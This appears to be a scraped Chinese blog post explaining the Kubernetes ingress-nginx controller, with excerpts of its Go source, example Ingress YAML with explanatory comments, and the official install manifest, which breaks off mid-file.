59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158  // syncIngress collects all the pieces required to assemble the NGINX // configuration file and passes the resulting data structures to the backend // (OnUpdate) when a reload is deemed necessary. func (n *NGINXController) syncIngress(interface{}) error { n.syncRateLimiter.Accept() if n.syncQueue.IsShuttingDown() { return nil } ings := n.store.ListIngresses() hosts, servers, pcfg := n.getConfiguration(ings) n.metricCollector.SetSSLExpireTime(servers) if n.runningConfig.Equal(pcfg) { klog.V(3).Infof(\u0026#34;No configuration change detected, skipping backend reload\u0026#34;) return nil } n.metricCollector.SetHosts(hosts) if !n.IsDynamicConfigurationEnough(pcfg) { klog.InfoS(\u0026#34;Configuration changes detected, backend reload required\u0026#34;) hash, _ := hashstructure.Hash(pcfg, \u0026amp;hashstructure.HashOptions{ TagName: \u0026#34;json\u0026#34;, }) pcfg.ConfigurationChecksum = fmt.Sprintf(\u0026#34;%v\u0026#34;, hash) err := n.OnUpdate(*pcfg) if err != nil { n.metricCollector.IncReloadErrorCount() n.metricCollector.ConfigSuccess(hash, false) klog.Errorf(\u0026#34;Unexpected failure reloading the backend:\\n%v\u0026#34;, err) n.recorder.Eventf(k8s.IngressPodDetails, apiv1.EventTypeWarning, \u0026#34;RELOAD\u0026#34;, fmt.Sprintf(\u0026#34;Error reloading NGINX: %v\u0026#34;, err)) return err } klog.InfoS(\u0026#34;Backend successfully reloaded\u0026#34;) n.metricCollector.ConfigSuccess(hash, true) n.metricCollector.IncReloadCount() n.recorder.Eventf(k8s.IngressPodDetails, apiv1.EventTypeNormal, \u0026#34;RELOAD\u0026#34;, \u0026#34;NGINX reload triggered due to a change in configuration\u0026#34;) } isFirstSync := n.runningConfig.Equal(\u0026amp;ingress.Configuration{}) if isFirstSync { // For the initial sync it always takes some time for NGINX to start listening  // For large configurations it might take a while so we loop and back off  klog.InfoS(\u0026#34;Initial sync, sleeping for 1 second\u0026#34;) time.Sleep(1 * time.Second) } retry := wait.Backoff{ Steps: 15, Duration: 1 * time.Second, Factor: 0.8, Jitter: 0.1, } err := wait.ExponentialBackoff(retry, func() (bool, error) { err := n.configureDynamically(pcfg) if err == nil { klog.V(2).Infof(\u0026#34;Dynamic reconfiguration succeeded.\u0026#34;) return true, nil } klog.Warningf(\u0026#34;Dynamic reconfiguration failed: %v\u0026#34;, err) return false, err }) if err != nil { klog.Errorf(\u0026#34;Unexpected failure reconfiguring NGINX:\\n%v\u0026#34;, err) return err } ri := getRemovedIngresses(n.runningConfig, pcfg) re := getRemovedHosts(n.runningConfig, pcfg) n.metricCollector.RemoveMetrics(ri, re) n.runningConfig = pcfg return nil } // OnUpdate is called by the synchronization loop whenever configuration // changes were detected. The received backend Configuration is merged with the // configuration ConfigMap before generating the final configuration file. // Returns nil in case the backend was successfully reloaded. func (n *NGINXController) OnUpdate(ingressCfg ingress.Configuration) error { cfg := n.store.GetBackendConfiguration() cfg.Resolver = n.resolver content, err := n.generateTemplate(cfg, ingressCfg) if err != nil { return err } err = createOpentracingCfg(cfg) if err != nil { return err } err = n.testTemplate(content) if err != nil { return err } if klog.V(2).Enabled() { src, _ := ioutil.ReadFile(cfgPath) if !bytes.Equal(src, content) { tmpfile, err := ioutil.TempFile(\u0026#34;\u0026#34;, \u0026#34;new-nginx-cfg\u0026#34;) if err != nil { return err } defer tmpfile.Close() err = ioutil.WriteFile(tmpfile.Name(), content, file.ReadWriteByUser) if err != nil { return err } diffOutput, err := exec.Command(\u0026#34;diff\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;\u0026#39;# Configuration.*\u0026#39;\u0026#34;, \u0026#34;-u\u0026#34;, cfgPath, tmpfile.Name()).CombinedOutput() if err != nil { if exitError, ok := err.(*exec.ExitError); ok { ws := exitError.Sys().(syscall.WaitStatus) if ws.ExitStatus() == 2 { klog.Warningf(\u0026#34;Failed to executing diff command: %v\u0026#34;, err) } } } klog.InfoS(\u0026#34;NGINX configuration change\u0026#34;, \u0026#34;diff\u0026#34;, string(diffOutput)) // we do not defer the deletion of temp files in order  // to keep them around for inspection in case of error  os.Remove(tmpfile.Name()) } } err = ioutil.WriteFile(cfgPath, content, file.ReadWriteByUser) if err != nil { return err } o, err := n.command.ExecCommand(\u0026#34;-s\u0026#34;, \u0026#34;reload\u0026#34;).CombinedOutput() if err != nil { return fmt.Errorf(\u0026#34;%v\\n%v\u0026#34;, err, string(o)) } return nil }   Server  Hostname Locations SSLPassthrough \u0026hellip;  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175  // Server describes a website type Server struct { // Hostname returns the FQDN of the server  Hostname string `json:\u0026#34;hostname\u0026#34;` // SSLPassthrough indicates if the TLS termination is realized in  // the server or in the remote endpoint  SSLPassthrough bool `json:\u0026#34;sslPassthrough\u0026#34;` // SSLCert describes the certificate that will be used on the server  SSLCert *SSLCert `json:\u0026#34;sslCert\u0026#34;` // Locations list of URIs configured in the server.  Locations []*Location `json:\u0026#34;locations,omitempty\u0026#34;` // Aliases return the alias of the server name  Aliases []string `json:\u0026#34;aliases,omitempty\u0026#34;` // RedirectFromToWWW returns if a redirect to/from prefix www is required  RedirectFromToWWW bool `json:\u0026#34;redirectFromToWWW,omitempty\u0026#34;` // CertificateAuth indicates the this server requires mutual authentication  // +optional  CertificateAuth authtls.Config `json:\u0026#34;certificateAuth\u0026#34;` // ProxySSL indicates the this server uses client certificate to access backends  // +optional  ProxySSL proxyssl.Config `json:\u0026#34;proxySSL\u0026#34;` // ServerSnippet returns the snippet of server  // +optional  ServerSnippet string `json:\u0026#34;serverSnippet\u0026#34;` // SSLCiphers returns list of ciphers to be enabled  SSLCiphers string `json:\u0026#34;sslCiphers,omitempty\u0026#34;` // SSLPreferServerCiphers indicates that server ciphers should be preferred  // over client ciphers when using the SSLv3 and TLS protocols.  SSLPreferServerCiphers string `json:\u0026#34;sslPreferServerCiphers,omitempty\u0026#34;` // AuthTLSError contains the reason why the access to a server should be denied  AuthTLSError string `json:\u0026#34;authTLSError,omitempty\u0026#34;` } // Location describes an URI inside a server. // Also contains additional information about annotations in the Ingress. // // In some cases when more than one annotations is defined a particular order in the execution // is required. // The chain in the execution order of annotations should be: // - Whitelist // - RateLimit // - BasicDigestAuth // - ExternalAuth // - Redirect type Location struct { // Path is an extended POSIX regex as defined by IEEE Std 1003.1,  // (i.e this follows the egrep/unix syntax, not the perl syntax)  // matched against the path of an incoming request. Currently it can  // contain characters disallowed from the conventional \u0026#34;path\u0026#34;  // part of a URL as defined by RFC 3986. Paths must begin with  // a \u0026#39;/\u0026#39;. If unspecified, the path defaults to a catch all sending  // traffic to the backend.  Path string `json:\u0026#34;path\u0026#34;` // PathType represents the type of path referred to by a HTTPIngressPath.  PathType *networking.PathType `json:\u0026#34;pathType\u0026#34;` // IsDefBackend indicates if service specified in the Ingress  // contains active endpoints or not. Returning true means the location  // uses the default backend.  IsDefBackend bool `json:\u0026#34;isDefBackend\u0026#34;` // Ingress returns the ingress from which this location was generated  Ingress *Ingress `json:\u0026#34;ingress\u0026#34;` // IngressPath original path defined in the ingress rule  IngressPath string `json:\u0026#34;ingressPath\u0026#34;` // Backend describes the name of the backend to use.  Backend string `json:\u0026#34;backend\u0026#34;` // Service describes the referenced services from the ingress  Service *apiv1.Service `json:\u0026#34;-\u0026#34;` // Port describes to which port from the service  Port intstr.IntOrString `json:\u0026#34;port\u0026#34;` // Overwrite the Host header passed into the backend. Defaults to  // vhost of the incoming request.  // +optional  UpstreamVhost string `json:\u0026#34;upstream-vhost\u0026#34;` // BasicDigestAuth returns authentication configuration for  // an Ingress rule.  // +optional  BasicDigestAuth auth.Config `json:\u0026#34;basicDigestAuth,omitempty\u0026#34;` // Denied returns an error when this location cannot not be allowed  // Requesting a denied location should return HTTP code 403.  Denied *string `json:\u0026#34;denied,omitempty\u0026#34;` // CorsConfig returns the Cors Configuration for the ingress rule  // +optional  CorsConfig cors.Config `json:\u0026#34;corsConfig,omitempty\u0026#34;` // ExternalAuth indicates the access to this location requires  // authentication using an external provider  // +optional  ExternalAuth authreq.Config `json:\u0026#34;externalAuth,omitempty\u0026#34;` // EnableGlobalAuth indicates if the access to this location requires  // authentication using an external provider defined in controller\u0026#39;s config  EnableGlobalAuth bool `json:\u0026#34;enableGlobalAuth\u0026#34;` // HTTP2PushPreload allows to configure the HTTP2 Push Preload from backend  // original location.  // +optional  HTTP2PushPreload bool `json:\u0026#34;http2PushPreload,omitempty\u0026#34;` // RateLimit describes a limit in the number of connections per IP  // address or connections per second.  // The Redirect annotation precedes RateLimit  // +optional  RateLimit ratelimit.Config `json:\u0026#34;rateLimit,omitempty\u0026#34;` // GlobalRateLimit similar to RateLimit  // but this is applied globally across multiple replicas.  // +optional  GlobalRateLimit globalratelimit.Config `json:\u0026#34;globalRateLimit,omitempty\u0026#34;` // Redirect describes a temporal o permanent redirection this location.  // +optional  Redirect redirect.Config `json:\u0026#34;redirect,omitempty\u0026#34;` // Rewrite describes the redirection this location.  // +optional  Rewrite rewrite.Config `json:\u0026#34;rewrite,omitempty\u0026#34;` // Whitelist indicates only connections from certain client  // addresses or networks are allowed.  // +optional  Whitelist ipwhitelist.SourceRange `json:\u0026#34;whitelist,omitempty\u0026#34;` // Proxy contains information about timeouts and buffer sizes  // to be used in connections against endpoints  // +optional  Proxy proxy.Config `json:\u0026#34;proxy,omitempty\u0026#34;` // ProxySSL contains information about SSL configuration parameters  // to be used in connections against endpoints  // +optional  ProxySSL proxyssl.Config `json:\u0026#34;proxySSL,omitempty\u0026#34;` // UsePortInRedirects indicates if redirects must specify the port  // +optional  UsePortInRedirects bool `json:\u0026#34;usePortInRedirects\u0026#34;` // ConfigurationSnippet contains additional configuration for the backend  // to be considered in the configuration of the location  ConfigurationSnippet string `json:\u0026#34;configurationSnippet\u0026#34;` // Connection contains connection header to override the default Connection header  // to the request.  // +optional  Connection connection.Config `json:\u0026#34;connection\u0026#34;` // ClientBodyBufferSize allows for the configuration of the client body  // buffer size for a specific location.  // +optional  ClientBodyBufferSize string `json:\u0026#34;clientBodyBufferSize,omitempty\u0026#34;` // DefaultBackend allows the use of a custom default backend for this location.  // +optional  DefaultBackend *apiv1.Service `json:\u0026#34;-\u0026#34;` // DefaultBackendUpstreamName is the upstream-formatted string for the name of  // this location\u0026#39;s custom default backend  DefaultBackendUpstreamName string `json:\u0026#34;defaultBackendUpstreamName,omitempty\u0026#34;` // XForwardedPrefix allows to add a header X-Forwarded-Prefix to the request with the  // original location.  // +optional  XForwardedPrefix string `json:\u0026#34;xForwardedPrefix,omitempty\u0026#34;` // Logs allows to enable or disable the nginx logs  // By default access logs are enabled and rewrite logs are disabled  Logs log.Config `json:\u0026#34;logs,omitempty\u0026#34;` // InfluxDB allows to monitor the incoming request by sending them to an influxdb database  // +optional  InfluxDB influxdb.Config `json:\u0026#34;influxDB,omitempty\u0026#34;` // BackendProtocol indicates which protocol should be used to communicate with the service  // By default this is HTTP  BackendProtocol string `json:\u0026#34;backend-protocol\u0026#34;` // FastCGI allows the ingress to act as a FastCGI client for a given location.  // +optional  FastCGI fastcgi.Config `json:\u0026#34;fastcgi,omitempty\u0026#34;` // CustomHTTPErrors specifies the error codes that should be intercepted.  // +optional  CustomHTTPErrors []int `json:\u0026#34;custom-http-errors\u0026#34;` // ModSecurity allows to enable and configure modsecurity  // +optional  ModSecurity modsecurity.Config `json:\u0026#34;modsecurity\u0026#34;` // Satisfy dictates allow access if any or all is set  Satisfy string `json:\u0026#34;satisfy\u0026#34;` // Mirror allows you to mirror traffic to a \u0026#34;test\u0026#34; backend  // +optional  Mirror mirror.Config `json:\u0026#34;mirror,omitempty\u0026#34;` // Opentracing allows the global opentracing setting to be overridden for a location  // +optional  Opentracing opentracing.Config `json:\u0026#34;opentracing\u0026#34;` }   部署 ingress是k8s内置资源类型，只需再安装ingress controller，以ingress-nginx-controller为例\ningress.yaml 注意：\n 不同版本k8s的apiVersion不同 ingress的namespace要与其关联的service的namespace一致  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94  apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:example-ingressannotations:nginx.ingress.kubernetes.io/rewrite-target:/$1kubernetes.io/ingress.class:\u0026#34;nginx\u0026#34;# nginx.ingress.kubernetes.io/backend-protocol: \u0026#34;HTTPS\u0026#34;# nginx.ingress.kubernetes.io/ssl-passthrough: \u0026#34;true\u0026#34;spec:rules:- host:hello-world.infohttp:paths:- path:/web1pathType:Prefixbackend:service:name:web-1-svcport:number:8080- path:/web2pathType:Prefixbackend:service:name:web-2-svcport:number:8080---apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:ivision-ingressnamespace:aistationannotations:# 这里不要使用rewrite-target的通配符/$1 或 $2，需根据实际业务场景配置# nginx.ingress.kubernetes.io/rewrite-target: /$1# 说明：对于不同的业务需要不同的rewrite-target处理（/ 或 /$1），则分开不同的ingress配置# 这里标识3个路由都rewrite到了/路径下nginx.ingress.kubernetes.io/rewrite-target:/# 在多ingress-controller中，指定使用nginx-ingress，需与nginx-ingress-controller的参数一致（默认值：nginx）kubernetes.io/ingress.class:\u0026#34;nginx\u0026#34;# 如后端服务为https，则backend-protocol: \u0026#34;HTTPS\u0026#34;# 该配置实际上是根据loc.BackendProtocol = anns.BackendProtocol，再进行buildProxyPass操作，# proxy_pass 配置方式: [proxy_pass http://upstream名称, proxy_pass https://upstream名称, proxy_pass grpc://upstream名称, ...] # 在nginx.conf中，配置 proxy_pass https://upstream_balancer# 如果http，则配置proxy_pass http://upstream_balancernginx.ingress.kubernetes.io/backend-protocol:\u0026#34;HTTPS\u0026#34;# ssl-passthrough 会本地启动tcp代理服务，绕过了nginx# nginx.ingress.kubernetes.io/ssl-passthrough: \u0026#34;true\u0026#34;# nginx.ingress.kubernetes.io/force-ssl-redirect: \u0026#34;false\u0026#34;spec:rules:# 采用域名# - host: test.example.com# http:# paths:# - path: /# pathType: Prefix# backend:# service:# name: ivision# port:# number: 8443# 可使用ip方式，匹配路径全路由- http:paths:- path:/vvvpathType:Prefixbackend:service:name:web-svcport:number:8443- path:/pathType:Prefixbackend:service:name:web-svcport:number:8443# 可以放到另个ingress配置中 - http:paths:- path:/docpathType:Prefixbackend:service:name:doc-svcport:number:8443  deploy.yaml 官方安装ingress-nginx-controller例子\n1  kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.46.0/deploy/static/provider/baremetal/deploy.yaml   也可先把deploy.yaml下载下来\napiVersion:v1kind:Namespacemetadata:name:ingress-nginxlabels:app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginx---# Source: ingress-nginx/templates/controller-serviceaccount.yamlapiVersion:v1kind:ServiceAccountmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginxnamespace:ingress-nginxautomountServiceAccountToken:true---# Source: ingress-nginx/templates/controller-configmap.yamlapiVersion:v1kind:ConfigMapmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginx-controllernamespace:ingress-nginxdata:---# Source: ingress-nginx/templates/clusterrole.yamlapiVersion:rbac.authorization.k8s.io/v1kind:ClusterRolemetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmname:ingress-nginxrules:- apiGroups:- \u0026#39;\u0026#39;resources:- configmaps- endpoints- nodes- pods- secretsverbs:- list- watch- apiGroups:- \u0026#39;\u0026#39;resources:- nodesverbs:- get- apiGroups:- \u0026#39;\u0026#39;resources:- servicesverbs:- get- list- watch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- ingressesverbs:- get- list- watch- apiGroups:- \u0026#39;\u0026#39;resources:- eventsverbs:- create- patch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- ingresses/statusverbs:- update- apiGroups:- networking.k8s.io # k8s 1.14+resources:- ingressclassesverbs:- get- list- watch---# Source: ingress-nginx/templates/clusterrolebinding.yamlapiVersion:rbac.authorization.k8s.io/v1kind:ClusterRoleBindingmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmname:ingress-nginxroleRef:apiGroup:rbac.authorization.k8s.iokind:ClusterRolename:ingress-nginxsubjects:- kind:ServiceAccountname:ingress-nginxnamespace:ingress-nginx---# Source: ingress-nginx/templates/controller-role.yamlapiVersion:rbac.authorization.k8s.io/v1kind:Rolemetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginxnamespace:ingress-nginxrules:- apiGroups:- \u0026#39;\u0026#39;resources:- namespacesverbs:- get- apiGroups:- \u0026#39;\u0026#39;resources:- configmaps- pods- secrets- endpointsverbs:- get- list- watch- apiGroups:- \u0026#39;\u0026#39;resources:- servicesverbs:- get- list- watch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- ingressesverbs:- get- list- watch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- ingresses/statusverbs:- update- apiGroups:- networking.k8s.io # k8s 1.14+resources:- ingressclassesverbs:- get- list- watch- apiGroups:- \u0026#39;\u0026#39;resources:- configmapsresourceNames:- ingress-controller-leader-nginxverbs:- get- update- apiGroups:- \u0026#39;\u0026#39;resources:- configmapsverbs:- create- apiGroups:- \u0026#39;\u0026#39;resources:- eventsverbs:- create- patch---# Source: ingress-nginx/templates/controller-rolebinding.yamlapiVersion:rbac.authorization.k8s.io/v1kind:RoleBindingmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginxnamespace:ingress-nginxroleRef:apiGroup:rbac.authorization.k8s.iokind:Rolename:ingress-nginxsubjects:- kind:ServiceAccountname:ingress-nginxnamespace:ingress-nginx---# Source: ingress-nginx/templates/controller-service-webhook.yamlapiVersion:v1kind:Servicemetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginx-controller-admissionnamespace:ingress-nginxspec:type:ClusterIPports:- name:https-webhookport:443targetPort:webhookselector:app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/component:controller---# Source: ingress-nginx/templates/controller-service.yamlapiVersion:v1kind:Servicemetadata:annotations:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginx-controllernamespace:ingress-nginxspec:type:NodePortports:- name:httpport:80protocol:TCPtargetPort:http- name:httpsport:443protocol:TCPtargetPort:httpsselector:app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/component:controller---# Source: ingress-nginx/templates/controller-deployment.yamlapiVersion:apps/v1kind:Deploymentmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginx-controllernamespace:ingress-nginxspec:selector:matchLabels:app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/component:controllerrevisionHistoryLimit:10minReadySeconds:0template:metadata:labels:app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/component:controllerspec:dnsPolicy:ClusterFirstcontainers:- name:controllerimage:k8s.gcr.io/ingress-nginx/controller:v0.46.0@sha256:52f0058bed0a17ab0fb35628ba97e8d52b5d32299fbc03cc0f6c7b9ff036b61aimagePullPolicy:IfNotPresentlifecycle:preStop:exec:command:- /wait-shutdownargs:- /nginx-ingress-controller- --election-id=ingress-controller-leader- --ingress-class=nginx- --configmap=$(POD_NAMESPACE)/ingress-nginx-controller- --validating-webhook=:8443- --validating-webhook-certificate=/usr/local/certificates/cert- --validating-webhook-key=/usr/local/certificates/keysecurityContext:capabilities:drop:- ALLadd:- NET_BIND_SERVICErunAsUser:101allowPrivilegeEscalation:trueenv:- name:POD_NAMEvalueFrom:fieldRef:fieldPath:metadata.name- name:POD_NAMESPACEvalueFrom:fieldRef:fieldPath:metadata.namespace- name:LD_PRELOADvalue:/usr/local/lib/libmimalloc.solivenessProbe:httpGet:path:/healthzport:10254scheme:HTTPinitialDelaySeconds:10periodSeconds:10timeoutSeconds:1successThreshold:1failureThreshold:5readinessProbe:httpGet:path:/healthzport:10254scheme:HTTPinitialDelaySeconds:10periodSeconds:10timeoutSeconds:1successThreshold:1failureThreshold:3ports:- name:httpcontainerPort:80protocol:TCP- name:httpscontainerPort:443protocol:TCP- name:webhookcontainerPort:8443protocol:TCPvolumeMounts:- name:webhook-certmountPath:/usr/local/certificates/readOnly:trueresources:requests:cpu:100mmemory:90MinodeSelector:kubernetes.io/os:linuxserviceAccountName:ingress-nginxterminationGracePeriodSeconds:300volumes:- name:webhook-certsecret:secretName:ingress-nginx-admission---# Source: ingress-nginx/templates/admission-webhooks/validating-webhook.yaml# before changing this value, check the required kubernetes version# https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#prerequisitesapiVersion:admissionregistration.k8s.io/v1kind:ValidatingWebhookConfigurationmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhookname:ingress-nginx-admissionwebhooks:- name:validate.nginx.ingress.kubernetes.iomatchPolicy:Equivalentrules:- apiGroups:- networking.k8s.ioapiVersions:- v1beta1operations:- CREATE- UPDATEresources:- ingressesfailurePolicy:FailsideEffects:NoneadmissionReviewVersions:- v1- v1beta1clientConfig:service:namespace:ingress-nginxname:ingress-nginx-controller-admissionpath:/networking/v1beta1/ingresses---# Source: ingress-nginx/templates/admission-webhooks/job-patch/serviceaccount.yamlapiVersion:v1kind:ServiceAccountmetadata:name:ingress-nginx-admissionannotations:helm.sh/hook:pre-install,pre-upgrade,post-install,post-upgradehelm.sh/hook-delete-policy:before-hook-creation,hook-succeededlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhooknamespace:ingress-nginx---# Source: ingress-nginx/templates/admission-webhooks/job-patch/clusterrole.yamlapiVersion:rbac.authorization.k8s.io/v1kind:ClusterRolemetadata:name:ingress-nginx-admissionannotations:helm.sh/hook:pre-install,pre-upgrade,post-install,post-upgradehelm.sh/hook-delete-policy:before-hook-creation,hook-succeededlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhookrules:- apiGroups:- admissionregistration.k8s.ioresources:- validatingwebhookconfigurationsverbs:- get- update---# Source: ingress-nginx/templates/admission-webhooks/job-patch/clusterrolebinding.yamlapiVersion:rbac.authorization.k8s.io/v1kind:ClusterRoleBindingmetadata:name:ingress-nginx-admissionannotations:helm.sh/hook:pre-install,pre-upgrade,post-install,post-upgradehelm.sh/hook-delete-policy:before-hook-creation,hook-succeededlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhookroleRef:apiGroup:rbac.authorization.k8s.iokind:ClusterRolename:ingress-nginx-admissionsubjects:- kind:ServiceAccountname:ingress-nginx-admissionnamespace:ingress-nginx---# Source: ingress-nginx/templates/admission-webhooks/job-patch/role.yamlapiVersion:rbac.authorization.k8s.io/v1kind:Rolemetadata:name:ingress-nginx-admissionannotations:helm.sh/hook:pre-install,pre-upgrade,post-install,post-upgradehelm.sh/hook-delete-policy:before-hook-creation,hook-succeededlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhooknamespace:ingress-nginxrules:- apiGroups:- \u0026#39;\u0026#39;resources:- secretsverbs:- get- create---# Source: ingress-nginx/templates/admission-webhooks/job-patch/rolebinding.yamlapiVersion:rbac.authorization.k8s.io/v1kind:RoleBindingmetadata:name:ingress-nginx-admissionannotations:helm.sh/hook:pre-install,pre-upgrade,post-install,post-upgradehelm.sh/hook-delete-policy:before-hook-creation,hook-succeededlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhooknamespace:ingress-nginxroleRef:apiGroup:rbac.authorization.k8s.iokind:Rolename:ingress-nginx-admissionsubjects:- kind:ServiceAccountname:ingress-nginx-admissionnamespace:ingress-nginx---# Source: ingress-nginx/templates/admission-webhooks/job-patch/job-createSecret.yamlapiVersion:batch/v1kind:Jobmetadata:name:ingress-nginx-admission-createannotations:helm.sh/hook:pre-install,pre-upgradehelm.sh/hook-delete-policy:before-hook-creation,hook-succeededlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhooknamespace:ingress-nginxspec:template:metadata:name:ingress-nginx-admission-createlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhookspec:containers:- name:createimage:docker.io/jettech/kube-webhook-certgen:v1.5.1imagePullPolicy:IfNotPresentargs:- create- --host=ingress-nginx-controller-admission,ingress-nginx-controller-admission.$(POD_NAMESPACE).svc- --namespace=$(POD_NAMESPACE)- --secret-name=ingress-nginx-admissionenv:- name:POD_NAMESPACEvalueFrom:fieldRef:fieldPath:metadata.namespacerestartPolicy:OnFailureserviceAccountName:ingress-nginx-admissionsecurityContext:runAsNonRoot:truerunAsUser:2000---# Source: ingress-nginx/templates/admission-webhooks/job-patch/job-patchWebhook.yamlapiVersion:batch/v1kind:Jobmetadata:name:ingress-nginx-admission-patchannotations:helm.sh/hook:post-install,post-upgradehelm.sh/hook-delete-policy:before-hook-creation,hook-succeededlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhooknamespace:ingress-nginxspec:template:metadata:name:ingress-nginx-admission-patchlabels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:admission-webhookspec:containers:- name:patchimage:docker.io/jettech/kube-webhook-certgen:v1.5.1imagePullPolicy:IfNotPresentargs:- patch- --webhook-name=ingress-nginx-admission- --namespace=$(POD_NAMESPACE)- --patch-mutating=false- 